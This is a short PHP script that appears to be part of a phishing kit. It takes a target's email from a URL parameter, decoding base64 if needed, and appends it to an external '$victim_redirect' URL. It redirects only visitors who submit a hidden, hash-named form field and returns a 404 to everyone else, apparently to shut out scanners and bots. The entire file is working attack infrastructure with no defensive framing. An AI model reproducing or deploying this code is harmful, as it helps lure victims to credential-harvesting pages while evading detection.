<?php
$victim_redirect = "https://mac.sa.com/6?ai=xd";

// Check if an "email" parameter is present in the URL
if (isset($_GET['email'])) {
    $email = $_GET['email'];

    // Try to decode the email assuming it might be base64 encoded
    $decoded_email = base64_decode($email, true);
    // Validate the decoded email; if valid, use it
    if ($decoded_email !== false && filter_var($decoded_email, FILTER_VALIDATE_EMAIL)) {
        $email = $decoded_email;
    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
        // If the plain text isn't a valid email either, clear it
        $email = '';
    }

    // If we have a valid email, append it to the redirect URL
    if (!empty($email)) {
        // Determine the proper separator based on whether the URL already has query parameters
        $separator = (strpos($victim_redirect, '?') !== false) ? '&' : '?';
        $victim_redirect .= $separator . 'email=' . urlencode($email);
    }
}

$session = isset($_POST['e84c04c00c8e6f1117a0c7c603adab81']) ? $_POST['e84c04c00c8e6f1117a0c7c603adab81'] : '';

if (!empty($session)) {
    session_start();
    session_destroy();
    session_start();
    $_SESSION['bot'] = false;
    header("Location: " . $victim_redirect);
    exit;
} else {
    http_response_code(404);
}
?>
